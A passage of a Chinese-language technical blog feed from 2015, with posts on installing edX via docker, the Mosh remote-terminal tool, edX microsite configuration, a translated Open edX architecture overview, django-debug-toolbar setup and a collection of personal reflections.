&lt;p&gt;由于docker跨平台，你可以任意在Windows/Linux/Mac下安装社区版的edX&lt;/p&gt;
&lt;p&gt;目前提供两种安装方式，分别适合一般用户和开发者。我们将一般用户定义为：无需技术背景，将edx视为教学工具的人员&lt;/p&gt;
&lt;h2&gt;方法一（一般用户）&lt;/h2&gt;
&lt;h3&gt;安装docker&lt;/h3&gt;
&lt;p&gt;国内用户建议从&lt;a href="http://get.daocloud.io/"&gt;daocloud&lt;/a&gt;里安装docker&lt;/p&gt;
&lt;p&gt;&lt;img alt="edx_cypress" src="/img/edx/docker/edx_cypress1.jpeg" /&gt;&lt;/p&gt;
&lt;h3&gt;拉取edx_cypress_docker镜像&lt;/h3&gt;
&lt;p&gt;考虑到国内网络，你可以从&lt;a href="http://45.32.248.32/edx_cypress_docker.1.11.tar.gz"&gt;这里&lt;/a&gt;下载docker镜像（edx_cypress_docker_1.11.tar.gz），之后load到docker中使用即可。感谢@netwalk0r同学将镜像上传到群共享&lt;/p&gt;
&lt;p&gt;docker load &amp;lt; /path/to/edx_cypress_docker_1.04.tar.gz&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/path/to/edx_cypress_docker_1.04.tar.gz&lt;/code&gt;为edx_cypress_docker_1.04.tar.gz的路径&lt;/p&gt;
&lt;p&gt;Docker Toolbox已经做好了主机和虚拟机的共享工作，所以使用起来十分顺手&lt;/p&gt;
&lt;p&gt;关于docker的入门可以看这里&lt;a href="http://dockerpool.com/static/books/docker_practice/introduction/README.html"&gt;docker_practice&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;至此edx安装完成&lt;/p&gt;
&lt;h3&gt;方法二（开发者）&lt;/h3&gt;
&lt;p&gt;安装docker的方法和方法一相同。&lt;/p&gt;
&lt;p&gt;网络顺畅的小伙伴们，建议直接使用从docker hub上拉取，这样能保证得到的是最新版本。镜像地址为&lt;a href="https://hub.docker.com/r/wwj718/edx_cypress_docker/"&gt;wwj718/edx_cypress_docker&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;一条指令拉取：sudo docker pull wwj718/edx_cypress_docker:1.05&lt;/p&gt;
&lt;p&gt;考虑到国内网络，建议使用docker的国内加速服务.可以参考这里&lt;a href="https://dashboard.daocloud.io/runtimes/new"&gt;daocloud&lt;/a&gt;（需要先注册daocloud）&lt;/p&gt;
&lt;h1&gt;运行edX&lt;/h1&gt;
&lt;p&gt;也只需要一条指令：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sudo docker run -itd -p 80:80 -p 2022:22 -p 18010:18010 wwj718/edx_cypress_docker:1.05&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;edX启动需要10秒左右的时间，片刻之后即可访问,enjoy it :)&lt;/p&gt;
&lt;p&gt;其中lms（学生端）在80端口，studio（课程制作）在18010端口，ssh端口在2022&lt;/p&gt;
&lt;p&gt;ssh用户名:root,密码:edx&lt;/p&gt;
&lt;p&gt;edx登录用户名：staff@example.com,密码：edx&lt;/p&gt;
&lt;h3&gt;如果端口冲突&lt;/h3&gt;
&lt;p&gt;如果以上端口被占用，也可以自行指定端口或使用随机分配端口:
&lt;code&gt;sudo docker run -itd  -P wwj718/edx_cypress_docker:1.05&lt;/code&gt;&lt;/p&gt;
&lt;h1&gt;更新&lt;/h1&gt;
&lt;p&gt;假设你想使用edx移动端的主题，需要更新到1.05版，只需要执行以下一条指令：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sudo docker pull wwj718/edx_cypress_docker:1.05&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;最新版本将更新在这里&lt;a href="https://github.com/wwj718/edx_cypress_docker"&gt;edx_cypress_docker&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;FQA&lt;/h1&gt;
&lt;h3&gt;为何使用docker&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;用户友好，出于演示和尝试目的使用edX的普通用户不需费力安装，拉取就可用&lt;/li&gt;
&lt;li&gt;开发者友好，方便团队协作，方便迭代开发，缩短开发周期&lt;/li&gt;
&lt;li&gt;未来趋势，官方devstack正往docker迁移&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;mac下开发&lt;/h3&gt;
&lt;p&gt;感谢@自定义 同学的分享，他把mac下的docker配置已经写得清晰完整了，我就不重复写这部分了.参考 &lt;a href="http://www.cnblogs.com/exnihilo/p/4891346.html"&gt;Mac OS下Boot2Docker的网络映射设置&lt;/a&gt;&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 13 Oct 2015 00:00:00 +0000</pubDate><guid>tag:,2015-10-13:edx-cypress-cn-install-and-use.html</guid><category>edx</category></item><item><title>推荐一款SSH连接工具：Mosh</title><link>/mosh.html</link><description>&lt;h1&gt;介绍&lt;/h1&gt;
&lt;p&gt;最初知道mosh，是在某一期的内核恐慌中。  &lt;/p&gt;
&lt;p&gt;经常使用SSH的人大约都有过以下遭遇，喝杯茶的功夫，SSH就断了，tmux当然是个保持会话的选择，可烦人的事你还得进进出出ssh，现在你有了更好的选择：Mosh,它除了能帮你维持持久的ssh连接之外，还能提供更多的优化，比如让你的输入体验丝般顺滑，如同本地一般，尽管你的服务器在国外。&lt;/p&gt;
&lt;p&gt;我现在的远程连接基本都是有Mosh，一次连接用不掉线，在移动办公，断网环境下简直酸爽。&lt;/p&gt;
&lt;h1&gt;正式的介绍&lt;/h1&gt;
&lt;p&gt;直接援引&lt;a href="https://mosh.mit.edu/"&gt;官网&lt;/a&gt;的介绍就好：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Remote terminal application that allows roaming, supports intermittent connectivity, and provides intelligent local echo and line editing of user keystrokes.&lt;/p&gt;
&lt;p&gt;Mosh is a replacement for SSH. It's more robust and responsive, especially over Wi-Fi, cellular, and long-distance links.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;安装&lt;/h1&gt;
&lt;p&gt;mosh是个服务，和ssh类似，有server何client，所以需要在通信的两台机器上都安装。我的客户机是mac，而服务器是ubuntu&lt;/p&gt;
&lt;h3&gt;在服务器（ubuntu）上&lt;/h3&gt;
&lt;p&gt;sudo apt-get install mosh&lt;/p&gt;
&lt;h3&gt;在客户机（mac）上&lt;/h3&gt;
&lt;p&gt;sudo brew install mosh&lt;/p&gt;
&lt;h1&gt;配置&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;在服务器上开放两个UDP端口：60001和60002 （云服务器需要设置防火墙规则）&lt;/li&gt;
&lt;li&gt;我一般习惯让服务端支持中文（两边对语言环境支持不同可能引发bug）&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;配置中文环境的详细步骤&lt;/h3&gt;
&lt;p&gt;参考&lt;a href="http://wwj718.github.io/ubuntu-server-daily.html"&gt;ubuntu server日常&lt;/a&gt;中的&lt;em&gt;支持中文&lt;/em&gt;&lt;/p&gt;
&lt;h1&gt;使用&lt;/h1&gt;
&lt;p&gt;mosh USERNAME@IP&lt;/p&gt;
&lt;h3&gt;SSH端口&lt;/h3&gt;
&lt;p&gt;如果你更改了SSH的默认端口(22),假设改为2022，那么你需要这样连接:&lt;br /&gt;
mosh --ssh="ssh -p 2022"  USERNAME@IP&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sat, 10 Oct 2015 00:00:00 +0000</pubDate><guid>tag:,2015-10-10:mosh.html</guid><category>linux</category></item><item><title>瓦碎集_第0章_20151010</title><link>/thought_20151010.html</link><description>&lt;h1&gt;缘起&lt;/h1&gt;
&lt;p&gt;大学以来，养成了随手记下所思所想的习惯，或是发呆时的脑洞大开，或是读书时的吐槽评论，或是游玩时的飞来灵感，想着先记下，待有空闲补全成章，奈何现实骨感，低估了自己的懒惰，残篇断句，形如碎瓦，散落在各种便签里，似乎也没有拼凑成章的可能&lt;/p&gt;
&lt;p&gt;索性破罐子破摔，就拎着它们，丢到博客上，素颜见人。&lt;/p&gt;
&lt;p&gt;目的有三：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;一来给博客调味，近来技术文章写得多，想添些生活气息&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;二来溺于书本和代码，旧友新交联系都少，想有个地方记录日常，朋友也能欣慰地看到，你这小子也并没有完全堕落在技术的细枝末节呀：）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;三来的话，把自己的思考和经验归档，表达以及分享，我想这和写博客的动机应该是相似的，何况也许有朝一日我万一勤奋起来，把这些碎片补全成章，也挺好玩的呀&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;尽量在每周末把它们整理出来，丢到博客上&lt;/p&gt;
&lt;hr /&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;互联网是一种新的规则而不只是一种新的工具&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;关于社区的运作，linus的建议极棒：Delegate it。学会授权，将能委派出去的事尽量派给他人。这是一种老谋深算的偷懒，以至于《大教堂与集市》在引述linus说的"我基本上是个很懒的人，别人做事，我得名誉。",之后加了一句&lt;code&gt;像狐狸那样懒&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;晚上又看了些维特根斯坦，突然想到就连聪明得令人咋舌的哲学家们，争论千年的问题，多数竟是受语言的误导造成的，多么荒诞而令人痛心。那么人们日常争论的话题呢？哈哈，一看之下，几乎绝大多数人们一本正经争得面红耳赤的大多话题，仅仅只是语言的问题，谈论者在谈论它们的时候是多么发自内心地严肃啊，他们有些站在主席台，有些甘心为此洒热血。人们一边受概念误导，不注意它们的用法，不加审视，一边竟对由此推演出的结论深信不疑。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;说到语言的误用，一些风趣的修辞，似乎是语言误用产生的效果，不知道这种误用给文学带来了多大的美感，这真是个有趣的副作用。换个角度，如果世界足够逻辑，纵然真理灼灼遍地，也挺乏味呀&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;统计学的趣味在于许多时候它是探索性的，带有发现的快感&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;简易规则可以构成异常精妙的系统，组合爆炸的威力十分惊人。这种自下而上的分布式系统，类似生物&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;看了些福柯，惊讶于权力机制之微妙。权力有扩散自身的倾向，在信息易于获取的今天，人们是不是变得更容易被监控？而黑客以一种难以预料的方式（入侵）起到让人们注意自己的隐私。他们理念上习惯于对抗权威，而效果上也做到了，只是途径并不显示出直接对抗，一种巧合，还是精明的自卫策略（可能无意）？  最后一句话是自私的基因让我想到的&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;按福柯的观念，拥有权力的人为何会愿意推进教育这些东西呢，因为由此产生收益大于亏损？边际为正？副作用造成了历史的进步？&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;公平公正只是人性的诉求的产物，类似的概念很多，多数问题是人的问题，这句话相当于没说，可是却让我们不会陷入到语言的陷阱里（以为这些概念是实体一样的存在）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;车上看完《撒哈拉的故事》,三毛真是个聪明温柔，浪漫彻骨，又潇洒坚韧的女人&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我原先以为商业应该是理性人的竞技场，拼的智商与见识，但看到朋友圈里还算成功的创业者们，天天发的洗脑鸡汤，以至于觉得商业上的运气看来才是影响成功的关键呀&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;评价最终总会回归到评价体系上来&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;颜值的说法很有意思，看去在放大它的作用，实际似乎相反，通过把它实体化，把它固定下来，不至于过于万能，这样外表仅是具体的价值之一。在没有物化它之前，它的影响力过于强大和不可捉摸。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;车上有点冷，天气明媚，靠窗听歌，人懒懒的，思维异常活跃&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;你只能用语言思考，语言的边界就是世界的边界。当你用它来表达情感时，尽量使用富有变现力的，而当你用它来思考时，尽量使用精确的&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;让非洲贫困地区用上手机的，可不是人道主义的援助，恰恰是自由竞争导致的科技福利&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;《美国大城市的死与生》，实际在讨论公共空间的自组织，难道不是建造社区的参考手册么&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;多数时候你一个人是极其敏捷的，如果你想做些更大的事，找到靠谱的聪明人。人的要素&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;火车行进在大西北，看到黄土上的稀疏植物，想起《失控》里说的，生命塑造了它们生活的环境。生物需要某种它们适合生活的环境，于是它们作用出这个结果。这是一种意志的力量，这不是励志的说法，意志这个词此处并不拟人，自私的基因中有大量类似的变达。这是一种从结果看像是有智能的行为&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;风和日丽的天气，五道口地铁站附近，动车穿过的时候，声音和画面都像极了《秒速五厘米》第三幕的情景&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sat, 10 Oct 2015 00:00:00 +0000</pubDate><guid>tag:,2015-10-10:thought_20151010.html</guid><category>thought</category></item><item><title>edX feature之microsite</title><link>/edx-feature-microsite.html</link><description>&lt;h1&gt;使用场景&lt;/h1&gt;
&lt;p&gt;使用edX做平台的公司/机构可能有这样的一种需求：希望划分出二级域名给子机构使用，或是给合作伙伴使用。好比某高校建了一个edX平台，它的各个学院(或是兄弟院校)在其上可以有独立的主页（可以独立设计，展示各自的课程），独立的logo，独立的sitename，独立的支付账号，而所有资源又最终汇总到大平台下，资源之间可以共享。&lt;/p&gt;
&lt;p&gt;这个场景对形成联盟和生态还是挺诱人的  不是吗&lt;/p&gt;
&lt;h1&gt;特性&lt;/h1&gt;
&lt;p&gt;以下东西是各个子域可以定制的&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;首页定制&lt;/li&gt;
&lt;li&gt;平台名称&lt;/li&gt;
&lt;li&gt;站点小图标：favicon&lt;/li&gt;
&lt;li&gt;二级域名前缀&lt;/li&gt;
&lt;li&gt;平台logo&lt;/li&gt;
&lt;li&gt;邮件发送者&lt;/li&gt;
&lt;li&gt;支付账号&lt;/li&gt;
&lt;li&gt;...&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;更多的定制项可以查看&lt;a href="https://github.com/edx/edx-platform/wiki/Microsites-Theming#django-configuration-settings-used-specifically-for-microsites"&gt;Django configuration settings used specifically for microsites.&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;配置示范&lt;/h1&gt;
&lt;p&gt;在lms.env.json的"FEATURES"中加上&lt;code&gt;"USE_MICROSITES": true,&lt;/code&gt;.同时在lms.env.json的主体中加上&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;    &lt;span class="s2"&gt;&amp;quot;MICROSITE_CONFIGURATION&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="s2"&gt;&amp;quot;test1&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="s2"&gt;&amp;quot;domain_prefix&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;test1&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="s2"&gt;&amp;quot;university&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;test1&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="s2"&gt;&amp;quot;SITE_NAME&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;sitename&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="s2"&gt;&amp;quot;logo_image_url&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;http://x.x.x/head-logo.gif&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="s2"&gt;&amp;quot;course_org_filter&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;test1&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="s2"&gt;&amp;quot;course_about_show_social_links&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;false&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="p"&gt;},&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;MICROSITE_ROOT_DIR&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;/edx/app/edxapp/edx-microsite&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;所有的静态文件应该在MICROSITE_ROOT_DIR目录下（页面定制过程很像theme）。以MICROSITE_CONFIGURATION中的key为子目录名，在此为test1。目录中的内容参考&lt;a href="https://github.com/edx/edx-platform/tree/master/common/test/test_microsites/test_microsite"&gt;test_microsite&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;此外，我在github上找到一个&lt;a href="https://github.com/jazkarta/edx-microsite-manager/blob/master/edx_microsite_manager/models.py"&gt;edx_microsite_manager&lt;/a&gt;，可以在admin里编辑管理MICROSITE_CONFIGURATION&lt;/p&gt;
&lt;h1&gt;Run&lt;/h1&gt;
&lt;p&gt;记得先讲域名泛解析到你的ip上&lt;/p&gt;
&lt;p&gt;配置好之后，记得&lt;code&gt;sudo /edx/bin/supervisorctl status edxapp:&lt;/code&gt;和&lt;a href="https://github.com/edx/configuration/wiki/edX-Managing-the-Full-Stack#compile-assets-manually"&gt;Compile assets manually&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;现在就可以访问子域啦：test1.mydomain.com&lt;/p&gt;
&lt;p&gt;&lt;img alt="microsite1" src="img/edx/microsite/microsite1.jpeg" /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="microsite2" src="img/edx/microsite/microsite2.jpeg" /&gt;&lt;/p&gt;
&lt;h1&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/edx-platform/wiki/Microsites-Theming"&gt;Microsites Theming&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/jazkarta/edx-microsite-manager/blob/master/edx_microsite_manager/models.py"&gt;edx_microsite_manager&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Fri, 09 Oct 2015 00:00:00 +0000</pubDate><guid>tag:,2015-10-09:edx-feature-microsite.html</guid><category>edx</category></item><item><title>Open edX体系架构[译文]</title><link>/Open-edX-Architecture-Translation.html</link><description>&lt;p&gt;接下来准备翻译一些文章。&lt;/p&gt;
&lt;p&gt;决定这样做是因为，在开发群里，@amspring提到&lt;code&gt;之前我知道论坛部分使用到轻量级的Sinatra，没有看到Rails，看好几个地方博客什么的涉及技术这块都写ROR,我以为我漏掉了什么呢 Rails比较重，这里提供简单接口的 使用Sinatra较符合&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;而不少群友似乎也觉得edX架构中使用了Rails，而实际上Rails并没有被采用，这类知识其实在官方的文章中都已经说清楚了&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;Open edX是一个基于web技术的平台，用于创建，发布和分析在线课程。它驱动着edx.org以及其他的许多在线教育网站。&lt;/p&gt;
&lt;p&gt;这篇文章准备站在较高的层面上来说明平台当前的架构方案，而不会深入到许多细节里。同时也描述出我们正在积极做着的变更。&lt;/p&gt;
&lt;h1&gt;技术&lt;/h1&gt;
&lt;p&gt;Open edX中，几乎所有的后端(服务器端)代码都是用Python写的，django作为web应用框架，使用Mako模板（译者注：替换Django原生模板）&lt;/p&gt;
&lt;p&gt;前端(浏览器端)代码主要用JavaScript来写。部分代码使用CoffeeScript来写，edX正将其替换为JavaScript。部分客户端代码(前端)由Backbone.js写成，更多的代码正在往这个框架上迁移。&lt;/p&gt;
&lt;p&gt;edX同时使用Sass和Bourbon框架来写css&lt;/p&gt;
&lt;h1&gt;组件&lt;/h1&gt;
&lt;p&gt;Open edX平台中有一组核心组件。在可能的情况下，这些组件采用稳定的，经过验证的的api来互相通信&lt;/p&gt;
&lt;p&gt;点击示意图可以查看Open edX的组件：&lt;/p&gt;
&lt;p&gt;&lt;img alt="edX_architecture_CMS_LMS_0" src="https://open.edx.org/sites/default/files/wysiwyg/open-edx-pages/edX_architecture_CMS_LMS_0.png" /&gt;&lt;/p&gt;
&lt;h3&gt;学习管理系统（LMS）&lt;/h3&gt;
&lt;p&gt;LMS是Open edX的核心部分，学生使用它来学习课程。LMS也提供教师面板。&lt;/p&gt;
&lt;p&gt;LMS采用了多种存储机制，课程存储在Mongo中，视频存储在YouTube和或亚马逊S3上，而每个学生的数据存储在MySQL数据库里&lt;/p&gt;
&lt;p&gt;学生浏览课程并与课程内容交互。这个过程产生的事件被推送到analytics pipeline里，这些事件将被收集，分析和发布&lt;/p&gt;
&lt;p&gt;当前edX正在把LMS打造成一个LTI服务提供者，以便Open edX课程组件能嵌入到其他学习平台&lt;/p&gt;
&lt;h3&gt;Studio&lt;/h3&gt;
&lt;p&gt;Studio是课程制作系统，课程团队使用它来创建和更新课程。Studio将课程内容写入到Mongo数据库中，之后LMS从中读取课程内容&lt;/p&gt;
&lt;h3&gt;课程浏览&lt;/h3&gt;
&lt;p&gt;Open edX提供了一个简单的前端页面用来浏览课程。edx.org有一个独立的主页和课程搜索页面，不过并没有开源&lt;/p&gt;
&lt;h3&gt;课程结构&lt;/h3&gt;
&lt;p&gt;Open edX的课程由单元构成，这些单元被称为XBlocks。任何人都可以写出新的XBlocks，教育者和技术人员可以利用xblock来扩充他们的课程组件。edX平台仍然包含着一些XModules组件，XModules组件是XBlocks的前一个版本。EdX正在将这部分XModules重写为XBlocks，逐渐将它移除。&lt;/p&gt;
&lt;p&gt;除了XBlocks，还有几种方法也可以拓展课程组件的行为：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;LMS支持LTI，课程作者可以集成其他LTI工具到Open edX课程中&lt;/li&gt;
&lt;li&gt;问题中，可以嵌入python代码来呈现问题或是评审学生的答案，这些python代码将在CodeJail中执行（隔离的环境）&lt;/li&gt;
&lt;li&gt;JavaScript组件能通过JS Input集成进去&lt;/li&gt;
&lt;li&gt;课件可以导入导出为Open Learning XML (OLX)，这是一种基于XML的格式&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;讨论&lt;/h3&gt;
&lt;p&gt;课程内的讨论由一个独立的论坛组件来驱动。这是为数不多没有采用Python来写的组件，它选择了Ruby的Sinatra框架，LMS使用了论坛组件提供的API
来与之通信，并将论坛集成到LMS中&lt;/p&gt;
&lt;p&gt;论坛带有一个通知服务，会通知学生有哪些他感兴趣的话题有了更新&lt;/p&gt;
&lt;h3&gt;移动端&lt;/h3&gt;
&lt;p&gt;Open edX也打造了移动端，包括iOS和Android平台，目前只允许学生看视频。edX正在强化他们&lt;/p&gt;
&lt;h3&gt;数据分析&lt;/h3&gt;
&lt;p&gt;记录学生行为的事件由Open edX的数据分析管道捕获。这些事件数据使用json格式存储在S3中。之后可以使用Hadoop来处理，分析聚合完的结果将被发布到MySQL中。这些分析结果将通过REST API传送到Insights中呈现给用户。Insights是一个Django app，课程讲师和网站管理员可以通过它来了解学生正在做什么，以及他们的学习习惯&lt;/p&gt;
&lt;p&gt;示意图中展示了Open edX中数据分析部分的架构:&lt;/p&gt;
&lt;p&gt;&lt;img alt="edX_Architecture_Analytics" src="https://open.edx.org/sites/default/files/wysiwyg/open-edx-pages/edX_Architecture_Analytics.png" /&gt;&lt;/p&gt;
&lt;h3&gt;后台进程&lt;/h3&gt;
&lt;p&gt;一些比较大的任务被丢到后台进程，而不是在请求中执行。这些任务是队列式和分布式的，使用了Celery and RabbitMQ来管理它们。例子如：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;课程学习评分（成绩单）&lt;/li&gt;
&lt;li&gt;群发邮件&lt;/li&gt;
&lt;li&gt;生成答案分布报告&lt;/li&gt;
&lt;li&gt;生成结业证书&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Open edX包含了一个叫做XQueue的可定制队列，用来跑自定义评级代码。这些都是独立的进程，用来运行计算密集型评估工作&lt;/p&gt;
&lt;h3&gt;搜索&lt;/h3&gt;
&lt;p&gt;Open edX在以下地方使用了Elasticsearch来搜索：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;课程内容&lt;/li&gt;
&lt;li&gt;讨论区&lt;/li&gt;
&lt;li&gt;学生笔记&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;原文&lt;/h1&gt;
&lt;p&gt;&lt;a href="https://open.edx.org/contributing-to-edx/architecture"&gt;Open edX Architecture&lt;/a&gt;&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Mon, 28 Sep 2015 00:00:00 +0000</pubDate><guid>tag:,2015-09-28:Open-edX-Architecture-Translation.html</guid><category>edx</category></item><item><title>在edx中使用新版的django-debug-toolbar来调试edx</title><link>/use-django-debug-toolbar-1.3.2-in-edx.html</link><description>&lt;p&gt;&lt;a href="https://github.com/django-debug-toolbar/django-debug-toolbar"&gt;django-debug-toolbar&lt;/a&gt;是django调试神器,对于edx开发助益极大,当前edx birch中集成的django-debug-toolbar版本是0.1.10，不支持缓存展示。&lt;/p&gt;
&lt;p&gt;为了调试缓存，想升级django-debug-toolbar，其仓库首页说，当前版本是1.3.2，支持django 1.4 到 1.8。于是在edx中安装新的django-debug-toolbar。切换到edxapp，之后uninstall旧的，最后pip install django-debug-toolbar==1.3.2.搞定。&lt;/p&gt;
&lt;p&gt;新旧版的django-debug-toolbar参数有些不同.需要做微调，具体可以参考&lt;a href="http://django-debug-toolbar.readthedocs.org/en/1.3.2/configuration.html"&gt;文档&lt;/a&gt;.其中更多的可选panel可以参考&lt;a href="http://django-debug-toolbar.readthedocs.org/en/1.3.2/panels.html"&gt;这里&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;我有时候会在夜深人静的时候直接调试真实线上环境（恶劣的习惯！）,我们需要临时对aws.py做些临时修改&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;DEBUG&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;
&lt;span class="n"&gt;TEMPLATE_DEBUG&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;
&lt;span class="c1"&gt;################################ DEBUG TOOLBAR ################################&lt;/span&gt;

&lt;span class="n"&gt;INSTALLED_APPS&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;debug_toolbar&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;debug_toolbar_mongo&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,)&lt;/span&gt; &lt;span class="c1"&gt;#&amp;#39;memcache_toolbar&amp;#39;&lt;/span&gt;

